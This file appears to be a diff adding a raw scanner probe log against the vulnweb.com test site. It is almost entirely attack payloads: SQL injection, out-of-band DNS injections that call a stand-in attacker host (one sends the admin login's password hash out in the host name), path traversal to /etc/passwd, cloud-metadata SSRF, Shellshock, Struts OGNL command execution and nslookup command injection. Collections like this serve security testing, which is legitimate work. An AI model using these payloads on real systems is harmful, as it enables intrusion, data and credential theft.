@@ -1,0 +1,1425 @@
+URL :  http://testphp.vulnweb.com/search.php?test=query 
+
+Directory/File Searching:
+    /style.css 
+    /robots.txt 
+    /server-status 
+    /server-info 
+    /node/1 
+    /sitemap.xml 
+    /node/2 
+    /crossdomain.xml 
+    /node/3 
+    /node/4 
+    /node/5 
+    /node/6 
+    /node/7 
+    /node/8 
+    /node/9 
+    /clientaccesspolicy.xml 
+    /node/10 
+    /node/11 
+    /tomcat-docs/index.html 
+    /node/12 
+    /docs/index.html 
+    /node/13 
+    /examples/jsp/index.html 
+    /node/14 
+    /jsp-examples/index.html 
+    /node/15 
+    /ABCtor195b0c0b6dfb430eb6d589b8ed5a775c.xml 
+    /jsp-examples/jsp2/simpletag/hello.JSP 
+    /node/16 
+    /jsp-examples/jsp2/simpletag/hello.jsp 
+    /node/17 
+    /examples/jsp/jsp2/simpletag/hello.JSP 
+    /node/18 
+    /examples/jsp/jsp2/simpletag/hello.jsp 
+    /node/19 
+    /<?php print(chr(78).chr(69).chr(84).chr(83).chr(80).chr(65).chr(82).chr(75).chr(45).chr(80).chr(72).chr(80).chr(45).chr(48).chr(45).(44353702950 (intval($_GET[997])*4567)).chr(45))?> 
+    /node/20 
+    /node/21 
+    /node/22 
+    /node/23 
+    /ABCtor09c44be173a0486e9d6fde2f72b90a5f.php 
+    /node/24 
+    /node/25 
+    /elmah.axd 
+    /errorlog.axd 
+    /awstats/awstats.pl 
+    /cgi-bin/awstats.pl 
+    /awstats/cgi-bin/awstats.pl 
+    /webstats/awstats.pl 
+    /awstats.old/cgi-bin/awstats.pl 
+    /plesk-stat/webstat/awstats.pl 
+    /mint/ 
+    /phpmyadmin/ 
+    /phpmyadmin/main.php 
+    /webalizer/ 
+    /rails/info/properties/ 
+    /_wpeprivate/config.json 
+
+    Filename Prefix:
+        "old_"
+        "bac_"
+        "bak_"
+        "backup_"
+        "Copy (2) of "
+        "Copy of copy of "
+        "Copy of "
+    Filename Postfix:
+        ".old"
+        "_old"
+        " - Copy - Copy"
+        " - Copy (2)"
+        " - Copy"
+        " (3rd copy)"
+        " (4th copy)"
+        " (another copy)"
+        " (copy)"
+        " (third copy)"
+    Extension:
+        .zip
+        .wim
+        .tar
+        .xz
+        .vb
+        .tar.xz
+        .tar.lzma
+        .tar.gz
+        .tar.bz2
+        .tar.7z
+        .xz
+        .lzma
+        .old
+        .jar
+        ~
+        .gz
+        .exe
+        .cs
+        .cbz
+        .bz2
+        .bak
+        .bac
+        .backup
+        .ar
+        .7z
+        .a
+        .1
+        .old
+        .inc
+        .include
+
+Headers:
+    Origin: http://ABCtor.com\r\nCookie: foo=bar\r\n
+    Upgrade-Insecure-Requests: 1\r\nReferer: http://testphp.vulnweb.com/search.php?NSNDX=637289299262824375&test=query\r\n
+    Origin: http://ABCtor.com.testphp.vulnweb.com\r\nCookie: foo=bar\r\n
+    Origin: null\r\nCookie: foo=bar\r\n
+    X-NS: N13238347S\r\nContent-Length: 0\r\n
+    Accept: */*
+    Accept: ABCtor/check
+    Accept: text/css,*/*;q=0.1
+    Accept: text/html,application/xhtml+x
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Connection: Keep-Alive
+    Cookie: foo=bar
+    Host: ABCtor
+    Host: testphp.vulnweb.com
+    Origin: http://ABCtor.com
+    Origin: http://ABCtor.com.testphp.vulnweb.com
+    Origin: http://testphp.vulnweb.com.ABCtor.com
+    Origin: null
+    Range: bytes=0-18446744073709551615
+    Referer: '
+    Referer: 000177.000.00000.000001/trace.axd
+    Referer: 000260.0034.000062.00000245/trace.axd
+    Referer: 017700000001/trace.axd
+    Referer: 0177.0.0.1/trace.axd
+    Referer: 0177.0.1/trace.axd
+    Referer: 0177.1/trace.axd
+    Referer: 026007031245/trace.axd
+    Referer: 0260.1847973/trace.axd
+    Referer: 0260.28.12965/trace.axd
+    Referer: 0260.28.50.165/trace.axd
+    Referer: 0x7f000001/trace.axd
+    Referer: 0x7f.0.0.1/trace.axd
+    Referer: 0x7f.0.1/trace.axd
+    Referer: 0x7f.1/trace.axd
+    Referer: 0xb0.1847973/trace.axd
+    Referer: 0xb01c32a5/trace.axd
+    Referer: 0xb0.28.12965/trace.axd
+    Referer: 0xb0.28.50.165/trace.axd
+    Referer: 127.0.0.1/elmah
+    Referer: 127.0.0.1/elmah.axd
+    Referer: 127.0.0.1/trace.axd
+    Referer: 127.0.1/trace.axd
+    Referer: 127.100.11.2/elmah
+    Referer: 127.100.11.2/elmah.axd
+    Referer: 127.100.11.2/trace.axd
+    Referer: 127.1/trace.axd
+    Referer: 16777343/trace.axd
+    Referer: 176.1847973/trace.axd
+    Referer: 176.28.12965/trace.axd
+    Referer: 176.28.50.165/elmah
+    Referer: 176.28.50.165/elmah.axd
+    Referer: 176.28.50.165/trace.axd
+    Referer: -1" and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+"
+    Referer: -1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+    Referer: -1 AND 'NS='ss
+    Referer: -1 AND ((SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25)))-- 1
+    Referer: 1/../../../../../../../../../../boot.ini
+    Referer: 1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7ebvfsorc46eaddrw67b3gkxr79exee'+'vxy.ABCtor.com')exec sp_executesql @r--
+    Referer: -1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7fus-4vzmkvla0vhj4wvcjdhsrjdrj8'+'qpa.ABCtor.com')exec sp_executesql @r--
+    Referer: 1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7ipje3zsfklzfbo8sp-lh8dzgl5bmvi'+'qo4.ABCtor.com')exec sp_executesql @r--
+    Referer: -1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7mqln0dtycjb2grlbx0gtn4voser_7s'+'iim.ABCtor.com')exec sp_executesql @r--
+    Referer: ::1/elmah
+    Referer: ::1/elmah.axd
+    Referer: 1/../../../../../../../../../../../etc/passwd
+    Referer: 1')exec('xp_dirtree ''\\zqvil4-pt7-0_6qj0ljw4glh8mw1c2tu5fvtrwpb'+'ie4.ABCtor.com'+'\c$\a''')--
+    Referer: 1;exec('xp_dirtree ''\\zqvil4-pt7-0amdlohb4elowbyxy8kthfwv74jig'+'z8a.ABCtor.com'+'\c$\a''')--
+    Referer: 1'))exec('xp_dirtree ''\\zqvil4-pt7bihmeciteywfrapzu-qzp-jibhzpjt'+'a_o.ABCtor.com'+'\c$\a''')--
+    Referer: -1';exec('xp_dirtree ''\\zqvil4-pt7jjd_mwj_bk45zg0quniwst6kfv2yeo'+'flk.ABCtor.com'+'\c$\a''')--
+    Referer: 1) exec('xp_dirtree ''\\zqvil4-pt7kwinxmagbnmqvrrsy_aw2jq0jhlzhp'+'bck.ABCtor.com'+'\c$\a''')--
+    Referer: 1')exec('xp_dirtree ''\\zqvil4-pt7maeqxoiaca65ldh4nkicb1xijv3o37'+'x24.ABCtor.com'+'\c$\a''')--
+    Referer: 1) exec('xp_dirtree ''\\zqvil4-pt7p2mf5kfjlefopzuabupvasbycckdi5'+'gvy.ABCtor.com'+'\c$\a''')--
+    Referer: 1))exec('xp_dirtree ''\\zqvil4-pt7pnapewtltnzkfwpcusspsjs1euv854'+'eiu.ABCtor.com'+'\c$\a''')--
+    Referer: 1;exec('xp_dirtree ''\\zqvil4-pt7qh2of8exyjcvx52_f67e04jz98j5q2'+'vhc.ABCtor.com'+'\c$\a''')--
+    Referer: 1'))exec('xp_dirtree ''\\zqvil4-pt7qmiidc2_eidtnpabf8izytuf1aytga'+'gsy.ABCtor.com'+'\c$\a''')--
+    Referer: -1';exec('xp_dirtree ''\\zqvil4-pt7us9q90phr8u3l0uojcrce0uye5r64d'+'zb8.ABCtor.com'+'\c$\a''')--
+    Referer: 1))exec('xp_dirtree ''\\zqvil4-pt7x0f-dehyo8dzu6hcrkqrm2lpsiaoik'+'jse.ABCtor.com'+'\c$\a''')--
+    Referer: 1';expr 268409241 - 17442;'
+    Referer: 1';expr 268409241 - 36759;'
+    Referer: 1;expr 268409241 - 38634;x
+    Referer: 1";expr 268409241 - 44851;"
+    Referer: 1";expr 268409241 - 72016;"
+    Referer: 1;expr 268409241 - 94735;x
+    Referer: -1 OR 1=1
+    Referer: -1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+    Referer: -1" OR 1=1 OR "1"="1
+    Referer: -1' OR 1=1 OR '1'='1
+    Referer: -1" OR 1=1 OR "ns"="ns
+    Referer: -1' OR 1=1 OR 'ns'='ns
+    Referer: -1 OR 17-7=10
+    Referer: -1 or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))
+    Referer: -1" or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+"
+    Referer: -1' or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+    Referer: -1 OR X='ss
+    Referer: -1'+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+    Referer: 1 + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR"*/
+    Referer: 1' || (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) || '
+    Referer: 1 + (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) + 1
+    Referer: 1;SELECT pg_sleep(25)--
+    Referer: 1');SELECT pg_sleep(25)--
+    Referer: 1';SELECT pg_sleep(25)--
+    Referer: 1);SELECT pg_sleep(25)--
+    Referer: ::1/trace.axd
+    Referer: 1 WAITFOR DELAY '0:0:25'--
+    Referer: 1) WAITFOR DELAY '0:0:25'--
+    Referer: %22%2bABCtor(0x00007D)%2b%22
+    Referer: %22%2bABCtor(0x000202)%2b%22
+    Referer: 2771524784/trace.axd
+    Referer: %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+    Referer: %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
+    Referer: 'AND 1=cast(0x5f21403264696c656d6d61 as varchar(8000)) or '1'='
+    Referer: /../../../../../../../../../../boot.ini
+    Referer: c%3a%5cboot.ini
+    Referer: '||cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)||'
+    Referer: cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)
+    Referer: cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(103)||chr(112)||chr(100)||chr(103)||chr(121)||chr(110)||chr(97)||chr(109)||chr(95)||chr(100)||chr(108)||chr(104)||chr(114)||chr(103)||chr(115)||chr(110)||chr(107)||chr(107)||chr(122)||chr(121)||chr(111)||chr(110)||chr(97)||chr(102)||chr(105)||chr(112)||chr(102)||chr(118)||chr(49)||chr(109)||chr(45)||chr(121)||chr(115)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric)
+    Referer: cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(111)||chr(102)||chr(102)||chr(102)||chr(116)||chr(100)||chr(101)||chr(50)||chr(108)||chr(53)||chr(120)||chr(105)||chr(115)||chr(110)||chr(105)||chr(116)||chr(122)||chr(115)||chr(118)||chr(101)||chr(111)||chr(52)||chr(122)||chr(100)||chr(49)||chr(45)||chr(112)||chr(122)||chr(119)||chr(98)||chr(111)||chr(99)||chr(105)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric)
+    Referer: cast((SELECT dblink_connect('host=zqvil4-pt7nimut3hwcf0usebkbbzcerdyirq4hx'||'k0c.ABCtor.com user=a password=a connect_timeout=2')) as numeric)
+    Referer: cast((SELECT dblink_connect('host=zqvil4-pt7unonklu9al4rpjqbc-r2xp4boqy2m-'||'c3e.ABCtor.com user=a password=a connect_timeout=2')) as numeric)
+    Referer: c:\boot.ini
+    Referer: '+convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))+'
+    Referer: convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))
+    Referer: '||CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))||'
+    Referer: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(108)||chr(100)||chr(103)||chr(121)||chr(121)||chr(52)||chr(120)||chr(104)||chr(104)||chr(105)||chr(45)||chr(106)||chr(113)||chr(55)||chr(98)||chr(107)||chr(98)||chr(48)||chr(100)||chr(108)||chr(98)||chr(112)||chr(52)||chr(116)||chr(114)||chr(105)||chr(108)||chr(119)||chr(121)||chr(122)||chr(115)||chr(101)||chr(107)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||'
+    Referer: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(95)||chr(99)||chr(105)||chr(100)||chr(100)||chr(52)||chr(110)||chr(104)||chr(108)||chr(57)||chr(112)||chr(97)||chr(101)||chr(105)||chr(110)||chr(107)||chr(55)||chr(107)||chr(100)||chr(110)||chr(49)||chr(116)||chr(101)||chr(110)||chr(105)||chr(49)||chr(108)||chr(116)||chr(99)||chr(117)||chr(98)||chr(106)||chr(119)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||'
+    Referer: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt74au6niizysy1e4funkamo2loqiy9ni'||'ef0.ABCtor.com') from DUAL))||'
+    Referer: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7ayjahlahtzis9e01tclz1irwhwro7i'||'m8i.ABCtor.com') from DUAL))||'
+    Referer: c:\windows\win.ini
+    Referer: data:;base64,TlM3NzU0NTYxNDQ2NTc1
+    Referer: dblink_connect('host=zqvil4-pt7lnkklcnr0m1upj0gkznqq8udqarfqd'||'fcs.ABCtor.com user=a password=a connect_timeout=2')
+    Referer: dblink_connect('host=zqvil4-pt7s6t_e0kdcw5hm6kncj5v6mcokaugve'||'csi.ABCtor.com user=a password=a connect_timeout=2')
+    Referer: declare @h varchar(999)select @h='1'+substring(name+'-'+master.sys.fn_varbintohexstr(ISNULL(password_hash,0x0)),0,63)+'.zqvil4-pt71tbrilbn_eck2-16t1wmqfi-zpjmlc'+'oq4.ABCtor.com' from sys.sql_logins WHERE principal_id=1;exec('xp_dirtree ''\\'+@h+'\c$''')
+    Referer: declare @h varchar(999)select @h='1'+substring(name+'-'+master.sys.fn_varbintohexstr(ISNULL(password_hash,0x0)),0,63)+'.zqvil4-pt73n2o7ugtxkj0w_baedzaozqm_giy2m'+'qhc.ABCtor.com' from sys.sql_logins WHERE principal_id=1;exec('xp_dirtree ''\\'+@h+'\c$''')
+    Referer: DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7tafvfflqz5rqfofgwjyvt4cdeeefie'+'jrg.ABCtor.com')exec sp_executesql @r
+    Referer: DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7zieoxt26hk42xj16_6ndq5cnpm9pgs'+'kdo.ABCtor.com')exec sp_executesql @r
+    Referer: () { :;}; echo "NS:" $(/bin/sh -c "expr 268409241 - 12910")
+    Referer: () { :;}; echo "NS:" $(/bin/sh -c "expr 268409241 - 31806")
+    Referer: . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/passwd
+    Referer: .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///etc/passwd
+    Referer: ....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+    Referer: ...//...//...//...//...//...//...//...//...//...//...//etc/passwd
+    Referer: /../../../../../../../../../../../etc/passwd
+    Referer: /etc/passwd
+    Referer: exec('xp_dirtree ''\\zqvil4-pt7c26xqtldj3zwp1zmnrln2qfgnmxoxa'+'9xa.ABCtor.com'+'\c$\a''')
+    Referer: exec('xp_dirtree ''\\zqvil4-pt7ztylcnuzqbtqbfz6154dzmliuprt3w'+'buo.ABCtor.com'+'\c$\a''')
+    Referer: |expr${IFS}268409241${IFS}-${IFS}1908
+    Referer: |expr${IFS}268409241${IFS}-${IFS}40151
+    Referer: expr 268409241 - 15203;
+    Referer: expr 268409241 - 38496
+    Referer: expr 268409241 - 59097;
+    Referer: expr 268409241 - 98071
+    Referer: file%3a%2f%2f%2fboot.ini
+    Referer: file:///boot.ini
+    Referer: file:///etc/passwd
+    Referer: file:///windows/win.ini
+    Referer: http://::1:22
+    Referer: http://127.0.0.1:22
+    Referer: http://127.0.0.1:3306
+    Referer: http://::1:3306
+    Referer: http://169.254.169.254/latest/meta-data/public-hostname
+    Referer: http://176.28.50.165:22
+    Referer: http://176.28.50.165:3306
+    Referer: http://aws.ABCtor.com/latest/meta-data/public-hostname
+    Referer: hTTp://ABCtor.com/n
+    Referer: http://testphp.vulnweb.com/crossdomain.xml
+    Referer: http://testphp.vulnweb.com/elmah
+    Referer: http://testphp.vulnweb.com/elmah.axd
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299262824375&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299307228671&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299377544060&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299437069630&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299481725882&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299539280793&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299594518983&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299649449983&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299689361753&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299735465199&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299782282839&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299809744567&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299837088112&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299864993179&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299893400389&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299920236567&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299946596334&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289299973029062&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289300000858472&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289300026419878&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289300050566044&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289300072395151&test=query
+    Referer: http://testphp.vulnweb.com/search.php?NSNDX=637289300097094760&test=query
+    Referer: http://testphp.vulnweb.com/search.php?test=query
+    Referer: http://testphp.vulnweb.com/server-status
+    Referer: http://testphp.vulnweb.com/trace.axd
+    Referer: (length(CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))))
+    Referer: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(106)||chr(121)||chr(115)||chr(103)||chr(119)||chr(115)||chr(121)||chr(111)||chr(111)||chr(119)||chr(116)||chr(101)||chr(115)||chr(121)||chr(104)||chr(105)||chr(116)||chr(107)||chr(109)||chr(97)||chr(104)||chr(113)||chr(97)||chr(119)||chr(116)||chr(50)||chr(109)||chr(100)||chr(51)||chr(102)||chr(101)||chr(107)||chr(56)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))))
+    Referer: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(109)||chr(53)||chr(48)||chr(106)||chr(56)||chr(119)||chr(119)||chr(109)||chr(114)||chr(122)||chr(48)||chr(55)||chr(51)||chr(102)||chr(102)||chr(97)||chr(99)||chr(105)||chr(122)||chr(102)||chr(116)||chr(45)||chr(101)||chr(103)||chr(119)||chr(101)||chr(52)||chr(115)||chr(104)||chr(115)||chr(118)||chr(103)||chr(52)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))))
+    Referer: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7agn0xixwdzpdqpbuozaow36gm60x8i'||'lkc.ABCtor.com') from DUAL))))
+    Referer: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7k6utcypufcbedsdwybqldgsq3iarnu'||'3dq.ABCtor.com') from DUAL))))
+    Referer: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='5861').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    Referer: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='6702').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    Referer: ABCtor222222
+    Referer: ABCtor222222
+    Referer: NS09%ef%bc%9cs1%ef%b9%a5DBL%ca%baSNGL%ca%b9NS09
+    Referer: NS-1NO
+    Referer: ns../../../../../../../../../../../boot.ini.......................................................................................................................................................................................
+    Referer: |nslookup${IFS}"zqvil4-pt7nal6texcfbbqukz5ka54jv-chtgrcj""jau.ABCtor.com"
+    Referer: |nslookup${IFS}"zqvil4-pt7rda6q0snyqedlq9r1d0baenbbourhe""wns.ABCtor.com"
+    Referer: "& nslookup zqvil4-pt7djxsaify7_zhpkjk7b09i0umfxxjm-^_vy.ABCtor.com&'\"`0&nslookup zqvil4-pt7djxsaify7_zhpkjk7b09i0umfxxjm-^_vy.ABCtor.com&`'
+    Referer: "&nslookup "zqvil4-pt7dkmmjzjdnejgzbanlfllodfvq6i0ef""vis.ABCtor.com"
+    Referer: nslookup "zqvil4-pt7dnylqss88e5fhnl_t7sdinspvlv8r1""dac.ABCtor.com"
+    Referer: & nslookup zqvil4-pt7fmuqmsfwirpdmoumcrdr4rrg1vkw1h^u_a.ABCtor.com&'\"`0&nslookup zqvil4-pt7fmuqmsfwirpdmoumcrdr4rrg1vkw1h^u_a.ABCtor.com&`'
+    Referer: '&nslookup "zqvil4-pt7hkbsruzvvbkcfkkvtmwppy2tkcha4e""wqw.ABCtor.com"
+    Referer: "& nslookup zqvil4-pt7isvk2ia-iql3usvyo6u8exg9coovpu^gfa.ABCtor.com&'\"`0&nslookup zqvil4-pt7isvk2ia-iql3usvyo6u8exg9coovpu^gfa.ABCtor.com&`'
+    Referer: &nslookup "zqvil4-pt7jlyy1tobpbtmxabawadirlwj-rspib""q7a.ABCtor.com"
+    Referer: '& nslookup zqvil4-pt7l-h5xae6prpvap8brvx-luyoyk7c-1^cku.ABCtor.com&'\"`0&nslookup zqvil4-pt7l-h5xae6prpvap8brvx-luyoyk7c-1^cku.ABCtor.com&`'
+    Referer: nslookup zqvil4-pt7nkthuhrcsmf1zg1w-w_-6b_0f40nrd^mls.ABCtor.com&'\"`0&nslookup zqvil4-pt7nkthuhrcsmf1zg1w-w_-6b_0f40nrd^mls.ABCtor.com&`'
+    Referer: "&nslookup "zqvil4-pt7oyxlf3b0gqfzwspwsjfpckgi73pkpd""ifk.ABCtor.com"
+    Referer: '& nslookup zqvil4-pt7rfkro8hhgox6otiocemvpvv2-p-2j-^taa.ABCtor.com&'\"`0&nslookup zqvil4-pt7rfkro8hhgox6otiocemvpvv2-p-2j-^taa.ABCtor.com&`'
